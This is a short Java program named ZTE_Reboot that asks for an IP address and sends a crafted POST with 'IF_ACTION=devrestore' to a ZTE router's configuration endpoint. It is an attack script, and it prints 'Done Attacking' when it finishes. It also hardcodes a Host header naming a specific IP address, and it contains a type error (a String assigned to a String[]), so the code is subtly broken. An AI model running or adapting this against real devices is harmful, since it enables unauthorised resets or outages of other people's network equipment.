package client;

import java.io.DataOutputStream;

import java.io.File;

import java.net.URL;
import java.net.URLConnection;

import java.util.Scanner;

import javax.swing.JOptionPane;

public class ZTE_Reboot {
    public static void main(String[] args) {
            try{        
                String[] ip = JOptionPane.showInputDialog("Enter the IP Address");
                        URL url = new URL("http://"+ip+"/manager_dev_conf_t.gch");
                                          String postData = "IF_ACTION=devrestore&flag=2&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1";
                                          URLConnection conn = url.openConnection();
                                          conn.setDoOutput(true);
                                          conn.setRequestProperty("Cache-Control","max-age=0");
                    conn.setRequestProperty("Upgrade-Insecure-Requests","1");
                    conn.setRequestProperty("Accept-Encoding"," gzip, deflate");
                    conn.setRequestProperty("Accept-Language"," en-US,en;q=0.5");
                    conn.setRequestProperty("Host"," 186.64.90.224");
                    conn.setRequestProperty("Connection"," keep-alive");
                    conn.setRequestProperty("User-Agent"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv,78.0) Gecko/20100101 Firefox/78.0");
                    conn.setRequestProperty("Accept"," text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                                          try (DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
                                                  dos.writeBytes(postData);
                                              System.out.println("Done Attacking");
                                          }
            }
            catch(Exception murle){
            murle.printStackTrace();
            }
        }
}
